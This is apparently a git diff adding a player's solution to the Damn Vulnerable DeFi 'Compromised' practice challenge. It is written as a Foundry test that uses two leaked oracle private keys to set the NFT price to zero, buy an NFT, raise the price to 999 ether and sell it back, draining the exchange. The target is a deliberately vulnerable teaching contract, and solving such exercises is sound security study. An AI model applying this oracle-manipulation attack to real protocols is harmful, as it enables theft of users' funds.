@@ -9,6 +9,7 @@ import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
 import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
 import {Exchange} from "../../src/compromised/Exchange.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
 
 contract CompromisedChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -20,7 +21,10 @@ contract CompromisedChallenge is Test {
     uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
     uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;
 
-
+    // I have the private key of the first address and the second one.
+    // Took it from the output of the http mesg.
+    // HEX --> ASCII, Base64 decode --> private key. 
+    // Generate an address from this private key (https://iancoleman.net/ethereum-private-key-to-address/)
     address[] sources = [
         0x188Ea627E3531Db590e6f1D71ED83628d1933088,
         0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
@@ -75,7 +79,54 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
+        //Intermediary intermediary = new Intermediary(exchange, recovery);
         
+        // Derive the addresses from the private keys I got
+        uint256 privateKey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+        uint256 privateKey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
+
+        address source1 = vm.addr(privateKey1);
+        address source2 = vm.addr(privateKey2);
+
+        assertEq(source1, sources[0]);
+        assertEq(source2, sources[1]);
+
+        vm.startBroadcast(privateKey1);
+        // Change the prices of the NFT
+        oracle.postPrice("DVNFT", 0);
+        vm.stopBroadcast();
+
+        vm.startBroadcast(privateKey2);
+        // Change the prices of the NFT
+        oracle.postPrice("DVNFT", 0);
+        vm.stopBroadcast();
+
+        // Buy NFT as a player for 0 ether
+        vm.prank(player);
+        uint256 nftId = exchange.buyOne{value: 1}();
+        //uint256 nftId = intermediary.buy{value: 1}();
+
+        vm.startBroadcast(privateKey1);
+        // Change the prices of the NFT
+        oracle.postPrice("DVNFT", 999 ether);
+        vm.stopBroadcast();
+
+        vm.startBroadcast(privateKey2);
+        // Change the prices of the NFT
+        oracle.postPrice("DVNFT", 999 ether);
+        vm.stopBroadcast();
+
+        // Sell NFT to rescue all the funds
+        vm.startPrank(player);
+        nft.approve(address(exchange), nftId);
+        exchange.sellOne(nftId);
+        vm.stopPrank();
+        //intermediary.sell(nftId);
+
+        assertEq(player.balance, EXCHANGE_INITIAL_ETH_BALANCE + PLAYER_INITIAL_ETH_BALANCE);
+
+        // Send the ether to the recovery account
+        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
     }
 
     /**
@@ -95,3 +146,35 @@ contract CompromisedChallenge is Test {
         assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
     }
 }
+
+
+
+//contract Intermediary is IERC721Receiver {
+//
+//    Exchange exchange;
+//    address recovery;
+//    constructor(Exchange _exchange, address _recovery){
+//        exchange = _exchange;
+//        recovery = _recovery;
+//    }
+//
+//    function buy() payable public returns (uint256 id) {
+//        id = exchange.buyOne{value: msg.value}();
+//    }
+//
+//    function sell(uint256 id) public {
+//        exchange.sellOne(id);
+//    }
+//
+//    function onERC721Received(
+//        address operator,
+//        address from,
+//        uint256 tokenId,
+//        bytes calldata data
+//    ) external returns (bytes4) {
+//
+//    }
+//
+//    receive() external payable {}
+//
+//}
